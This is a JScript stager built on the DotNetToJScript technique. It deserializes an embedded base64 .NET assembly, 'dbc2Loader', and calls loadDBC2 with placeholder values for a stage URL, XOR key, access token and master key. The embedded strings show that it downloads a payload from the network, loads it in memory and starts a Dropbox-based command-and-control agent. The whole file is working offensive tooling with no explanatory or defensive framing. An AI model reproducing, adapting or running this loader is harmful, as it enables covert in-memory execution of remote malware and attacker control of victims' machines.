function setversion() {
var shell = new ActiveXObject('WScript.Shell');
ver = 'v4.0.30319';
try {
shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
} catch(e) { 
ver = 'v2.0.50727';
}
shell.Environment('Process')('COMPLUS_Version') = ver;

}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMASkbSWQAAAAAA"+
"AAAA4AACIQsBCwAACgAAAAYAAAAAAAAuKAAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA1CcA"+
"AFcAAAAAQAAAsAIAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAAA0CAAAACAAAAAKAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAsAIAAABA"+
"AAAABAAAAAwAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAQAAAAAAAAAAAA"+
"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAABAoAAAAAAAASAAAAAIABQD0IQAA4AUAAAEAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKgIoBAAACgAA"+
"ACoAEzAGADoAAAABAAARAAKOaY0FAAABChYLKxwABgcCB5EDBwNvBQAACl1vBgAACmHSnAAHF1gL"+
"BwKOaf4EDQkt2gYMKwAIKgAAEzAGADcAAAACAAARAAKOaRj+ARb+AQoGLRsAcwEAAAYCFpoCF5oC"+
"GJoCGZooBAAABgAAKw0AcgEAAHAoBwAACgAAKgAbMAMA5AAAAAMAABEAcwgAAAoKKAkAAAoLBxT+"+
"ARMJEQktFgAHKAoAAApvCwAACgAGB28MAAAKAAAUDAAGA28NAAAKBCgCAAAGDADeKQ0AKxUACW8O"+
"AAAKKAcAAAoACW8PAAAKDQAJFP4BFv4BEwkRCS3eAN4AAAgoEAAAChMEEQRyNQAAcG8RAAAKEwUY"+
"jQYAAAETChEKFgWiEQoXDgSiEQoTBheNAQAAARMLEQsWEQaiEQsTBwARBREHKBIAAAoTCADeKQ0A"+
"KxUACW8OAAAKKAcAAAoACW8PAAAKDQAJFP4BFv4BEwkRCS3eAN4AACoBHAAAAAAvABJBACkNAAAB"+
"AACqAA+5ACkNAAABQlNKQgEAAQAAAAAADAAAAHY0LjAuMzAzMTkAAAAABQBsAAAA7AEAACN+AABY"+
"AgAAUAIAACNTdHJpbmdzAAAAAKgEAABcAAAAI1VTAAQFAAAQAAAAI0dVSUQAAAAUBQAAzAAAACNC"+
"bG9iAAAAAAAAAAIAAAFHFQIACQAAAAD6JTMAFgAAAQAAABAAAAACAAAABAAAAAcAAAASAAAAAwAA"+
"AAMAAAABAAAAAgAAAAAACgABAAAAAAAGADQALQAGAKQAhAAGAMQAhAAGAAEB4gAGABUBLQAGABoB"+
"LQAGADYBLQAKAFMBSAEKAF0BSAEKAGgBSAEKAIYBSAEKAJYBSAEGAOEBLQAGABwCCgIGACoCLQAG"+
"ADcCLQAAAAAAAQAAAAAAAQABAAEAEAAZAAAABQABAAEAUCAAAAAAhhg7AAoAAQBcIAAAAACRAEEA"+
"DgABAKQgAAAAAJYARQAWAAMA6CAAAAAAhgBKABwABAAAAAEAUwAAAAIAWgAAAAEAXgAAAAEAYwAA"+
"AAIAZwAAAAMAbgAAAAQAegARADsAJAAZADsACgAhADsAKQAJADsACgAxACEBNAAxACwBOAA5AD4B"+
"RgBBADsACgBJAHIBTwBZAKMBVABRALoBWQBBAMoBXwBBANQBZQBpAOsBawBpAPcBbwBxACUCdABx"+
"AC8CewCBAEECgQAuAAsAogAuABMAqwBDABsALgA9AEsAiQAEgAAAAAAAAAAAAAAAAAAAAAAZAAAA"+
"BAAAAAAAAAAAAAAAAQAkAAAAAAAEAAAAAAAAAAAAAAABAC0AAAAAAAAAADxNb2R1bGU+AGRiYzJM"+
"b2FkZXIuZGxsAGRiYzJMb2FkZXIAbXNjb3JsaWIAU3lzdGVtAE9iamVjdAAuY3RvcgB4b3IATWFp"+
"bgBsb2FkREJDMgBzb3VyY2UAa2V5AGFyZ3MAdXJsAHhvcktleQBhY2Nlc3NUb2tlbgBtYXN0ZXJL"+
"ZXkAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25z"+
"QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLklu"+
"dGVyb3BTZXJ2aWNlcwBDb21WaXNpYmxlQXR0cmlidXRlAEJ5dGUAU3RyaW5nAGdldF9MZW5ndGgA"+
"Z2V0X0NoYXJzAENvbnNvbGUAV3JpdGVMaW5lAFN5c3RlbS5OZXQAV2ViQ2xpZW50AFdlYlJlcXVl"+
"c3QASVdlYlByb3h5AGdldF9EZWZhdWx0V2ViUHJveHkAQ3JlZGVudGlhbENhY2hlAElDcmVkZW50"+
"aWFscwBnZXRfRGVmYXVsdENyZWRlbnRpYWxzAHNldF9DcmVkZW50aWFscwBzZXRfUHJveHkARG93"+
"bmxvYWREYXRhAEV4Y2VwdGlvbgBnZXRfTWVzc2FnZQBnZXRfSW5uZXJFeGNlcHRpb24AU3lzdGVt"+
"LlJlZmxlY3Rpb24AQXNzZW1ibHkATG9hZABUeXBlAEdldFR5cGUAQWN0aXZhdG9yAENyZWF0ZUlu"+
"c3RhbmNlAAAzWwBFAFIAUgBPAFIAXQAgAE0AaQBzAHMAaQBuAGcAIABhAHIAZwB1AG0AZQBuAHQA"+
"cwAAJWQAcgBvAHAAYgBvAHgAYwAyAC4AQwAyAF8AQQBnAGUAbgB0AAAA3U8y7RZ6yUu3Fhqr/Omc"+
"sgAIt3pcVhk04IkDIAABBwACHQUdBQ4FAAEBHQ4HIAQBDg4ODgQgAQEIBCABAQIFAQABAAADIAAI"+
"BCABAwgIBwQdBQgdBQIEAAEBDgMHAQIEAAASKQQAABIxBSABARIxBSABARIpBSABHQUOAyAADgQg"+
"ABI1BgABEjkdBQUgARI9DgcAAhwSPR0cGAcMEiESKR0FEjUSORI9HQ4dHBwCHQ4dHAgBAAgAAAAA"+
"AB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEAAPwnAAAAAAAAAAAAAB4oAAAAIAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAQKAAAAAAAAAAAAAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3Jl"+
"ZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAA"+
"AAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAAVAIAAAAAAAAAAAAAVAI0AAAA"+
"VgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAAAAAAAAAAAAAAAAAAA"+
"AD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8A"+
"AAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBLQBAAABAFMAdAByAGkAbgBn"+
"AEYAaQBsAGUASQBuAGYAbwAAAJABAAABADAAMAAwADAAMAA0AGIAMAAAACwAAgABAEYAaQBsAGUA"+
"RABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAAAgAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBu"+
"AAAAAAAwAC4AMAAuADAALgAwAAAAQAAPAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABkAGIA"+
"YwAyAEwAbwBhAGQAZQByAC4AZABsAGwAAAAAACgAAgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBn"+
"AGgAdAAAACAAAABIAA8AAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAZABiAGMA"+
"MgBMAG8AYQBkAGUAcgAuAGQAbABsAAAAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBv"+
"AG4AAAAwAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8A"+
"bgAAADAALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAAAwOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVm"+
"bGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA";
var entry_class = 'dbc2Loader';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var n = fmt.SurrogateSelector;
	var d = fmt.Deserialize_2(stm);
	al.Add(n);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	o.loadDBC2("${stagePublicURL}","${xorKey}","${accessToken}","${masterKey}");
	
} catch (e) {
    debug(e.message);
}
